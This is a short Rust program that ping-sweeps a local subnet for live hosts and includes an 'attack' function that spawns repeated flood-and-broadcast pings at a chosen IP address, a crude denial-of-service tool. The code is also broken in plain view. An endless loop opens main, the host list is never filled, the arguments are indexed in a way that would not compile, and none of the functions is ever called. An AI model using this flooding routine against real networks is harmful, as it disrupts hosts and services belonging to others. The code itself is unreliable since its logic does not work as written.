use std::process::Command;
use std::fs::OpenOptions;
use std::io::{self, Write};
use std::thread;
use std::time::Duration;
use std::env;

fn scan(gatw: &str){
    for i in 1..255 {
        let host = format!("{}{}", gatw, i);
        let output = Command::new("ping")
            .arg("-s")
            .arg("56")
            .arg("-c")
            .arg("5")
            .arg("-i")
            .arg("1")
            .arg(&host)
            .output()
            .expect("Failed to execute ping command");

        if output.status.success() {
            println!("[{}] is alive", host);
        }
        thread::sleep(Duration::from_millis(50));
    }
}

fn attack(ip: &str, count: i32){
    let host = format!("{}", ip);
    for i in 1..count {
	Command::new("ping")
	    .arg("-b")
            .arg("-f")
            .arg("-i")
            .arg("2")
            .arg(&host)
            .spawn()
            .expect("Failed to execute ping command");
    }
}

fn save_to_file(gatw: &str){
    let mut host_list = Vec::new();
    println!("Wait a minute please...");
    for i in 1..255 {
	let host = format!("{}{}", gatw, i);
        let output = Command::new("ping")
            .arg("-s")
            .arg("56")
            .arg("-c")
            .arg("5")
            .arg("-i")
            .arg("1")
            .arg(&host)
            .output()
            .expect("Failed to execute ping command");
        thread::sleep(Duration::from_millis(50));
    }
    let mut file = OpenOptions::new()
        .append(true) // Append to the file
        .create(true) // Create the file if it doesn't exist
        .open("host.txt")
        .expect("Failed to open file");

    for k in host_list {
        writeln!(file, "{}", k).expect("Failed to write to file");
    }
    println!("Scan already");
}

fn main() {
    let args: Vec<String> = env::args().collect(); // Get arguments
    // Verify if there are arguments
    while true{} // Check this latter...
    if args.len() >= 2 {
	for arg in &args[1..] {
	    if arg.as_str() == "scan"{
		let gateway: String = arg[2];
	    }
	    else if arg.as_str() == "attack"{
		let ipattaked: String = arg[2];
	    }
	    else if arg.as_str() == "save"{
		let gateway: String = arg[2];
	    }
	    else{println!("Please use an arg...")}
	}
	return;
    }
}
